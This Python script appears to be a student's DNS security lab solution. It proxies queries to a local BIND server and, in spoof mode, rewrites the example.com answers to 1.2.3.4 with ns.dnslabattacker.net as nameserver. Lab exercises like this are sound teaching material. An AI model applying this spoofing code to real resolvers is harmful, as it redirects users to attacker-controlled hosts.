#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
BUFFER_SIZE = 8192
SPOOF_IP = "1.2.3.4"
SPOOF_NS = "ns.dnslabattacker.net"
local_host = "127.0.0.1"
SPOOF_NAME = "example.com."

#set up udp port for listen
listen_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
listen_socket.bind((local_host,port))


def DNS_handler(data,address):
    #DNS packet
    dns_fwd_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    dns_fwd_socket.sendto(data,(local_host, dns_port))
    print("DNS data sent to dns port "+ str (dns_port))
    
    while True:

        dns_res_data,dns_res_address = dns_fwd_socket.recvfrom(BUFFER_SIZE)
        print("DNS received packet from forward port"+ str(dns_res_address))
        
        #check if there is response data
        if dns_res_data == None:
            continue
        
        #serialize the data with DNS
        dns_packet = DNS(dns_res_data)
        
        #part 3
        query_name = dns_packet.qd.qname.decode("utf-8")
        if SPOOF and query_name == SPOOF_NAME:
            print("Part3: SPOOF mode and query name match sproof target")
            
            print("The current dns response:")
            print(dns_packet.show())

            #domain name
            q_name = dns_packet[DNSQR].qname

            #replace info
            dns_packet[DNS].an = DNSRR(rrname = q_name, type = "A", rdata = SPOOF_IP)
            dns_packet[DNS].ns = DNSRR(rrname=q_name, type="NS", rdata=SPOOF_NS)
            dns_packet[DNS].ancount = 1 
            
            ns_count = dns_packet[DNS].nscount
            if ns_count == 0:
                dns_packet[DNS].ns = None
            elif ns_count == 1:
                dns_packet[DNS].ns = DNSRR(rrname = q_name, type = "NS", rdata = SPOOF_NS)
            else:
                count = 1
                while count < ns_count:
                    dns_packet[DNS].ns = dns_packet[DNS].ns / DNSRR(rrname=q_name, type="NS", rdata=SPOOF_NS)
                    count += 1

            #delete additional section    
            del dns_packet[DNS].ar
            print("The spoofed dns response:")
            print(dns_packet.show())

        else:
            print("Part2")

        print("DNS  packet send to listen port"+ str(address))
        listen_socket.sendto(bytes(dns_packet), address)
    
    dns_fwd_socket.close()


def DNS_server():
    try:
        while True:
            #DNS proxy UDP pocket
            print("DNS proxy listening on port "+ str (port))
            data,address = listen_socket.recvfrom(BUFFER_SIZE)
            print("DNS proxy received packet from "+ str(address))
            DNS_handler(data,address)

    except KeyboardInterrupt:
        print("DNS proxy down")

if __name__ == "__main__":
    DNS_server()